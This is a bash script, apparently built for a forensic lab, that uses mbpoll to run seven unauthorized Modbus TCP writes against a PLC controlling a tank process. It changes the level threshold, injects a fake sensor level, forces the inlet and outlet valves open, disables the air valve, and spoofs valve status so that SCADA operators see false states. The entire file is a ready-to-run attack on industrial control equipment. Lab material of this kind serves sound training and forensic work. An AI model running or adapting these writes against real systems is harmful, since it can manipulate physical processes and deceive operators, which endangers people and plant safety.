#!/usr/bin/env bash
set -e

# ============================================================
# MODBUS UNAUTHORIZED WRITE ATTACK – FORENSIC LAB
# Target PLC: 10.0.2.22
# Protocol : Modbus TCP
# Duration : 2 seconds per register
# Tool     : mbpoll
# ============================================================

PLC_IP="10.0.2.22"
UNIT_ID=1
SLEEP_TIME=2

echo "[*] Starting Modbus unauthorized write attack"
echo "[*] Target PLC: $PLC_IP"
echo

# ------------------------------------------------------------
# ATTACK 1: Modify LEVEL_MAX (Holding Register 400004)
# PLC variable: level_max (%QW3)
# Impact: Changes tank threshold → silent logic manipulation
# Modbus FC: 6 (Write Single Register)
# ------------------------------------------------------------
echo "[ATTACK] Modifying level_max (400004) → value = 10"
mbpoll -m tcp -a $UNIT_ID -r 4 -t 3 -c 1 -W 10 $PLC_IP
sleep $SLEEP_TIME

# ------------------------------------------------------------
# ATTACK 2: Modify LEVEL (Holding Register 400003)
# PLC variable: level (%QW2)
# Impact: Fake sensor value → physical process deception
# Modbus FC: 6 (Write Single Register)
# ------------------------------------------------------------
echo "[ATTACK] Modifying level (400003) → value = 5"
mbpoll -m tcp -a $UNIT_ID -r 3 -t 3 -c 1 -W 5 $PLC_IP
sleep $SLEEP_TIME

# ------------------------------------------------------------
# ATTACK 3: Force inlet valve OPEN
# PLC variable: openInletValve (%QX0.4)
# Coil: 5
# Impact: Bypass PLC logic, force filling
# Modbus FC: 5 (Write Single Coil)
# ------------------------------------------------------------
echo "[ATTACK] Forcing openInletValve (coil 5) → ON"
mbpoll -m tcp -a $UNIT_ID -r 5 -t 0 -c 1 -W 1 $PLC_IP
sleep $SLEEP_TIME

# ------------------------------------------------------------
# ATTACK 4: Force outlet valve OPEN
# PLC variable: openOutletValve (%QX0.1)
# Coil: 2
# Impact: Forced draining
# Modbus FC: 5 (Write Single Coil)
# ------------------------------------------------------------
echo "[ATTACK] Forcing openOutletValve (coil 2) → ON"
mbpoll -m tcp -a $UNIT_ID -r 2 -t 0 -c 1 -W 1 $PLC_IP
sleep $SLEEP_TIME

# ------------------------------------------------------------
# ATTACK 5: Disable air valve
# PLC variable: airValveOpenStatus (%QX0.6)
# Coil: 7
# Impact: Process logic alteration (conditions change)
# Modbus FC: 5 (Write Single Coil)
# ------------------------------------------------------------
echo "[ATTACK] Disabling airValveOpenStatus (coil 7) → OFF"
mbpoll -m tcp -a $UNIT_ID -r 7 -t 0 -c 1 -W 0 $PLC_IP
sleep $SLEEP_TIME

# ------------------------------------------------------------
# ATTACK 6: Fake outlet valve status
# PLC variable: outletValveOpenStatus (%QX0.3)
# Coil: 4
# Impact: Operator deception (false feedback)
# ------------------------------------------------------------
echo "[ATTACK] Faking outletValveOpenStatus (coil 4) → ON"
mbpoll -m tcp -a $UNIT_ID -r 4 -t 0 -c 1 -W 1 $PLC_IP
sleep $SLEEP_TIME

# ------------------------------------------------------------
# ATTACK 7: Fake inlet valve status
# PLC variable: inletValveOpenStatus (%QX0.5)
# Coil: 6
# Impact: SCADA shows false actuator state
# ------------------------------------------------------------
echo "[ATTACK] Faking inletValveOpenStatus (coil 6) → ON"
mbpoll -m tcp -a $UNIT_ID -r 6 -t 0 -c 1 -W 1 $PLC_IP
sleep $SLEEP_TIME

echo
echo "[*] Attack sequence completed"
echo "[*] All modifications performed via legitimate Modbus writes"
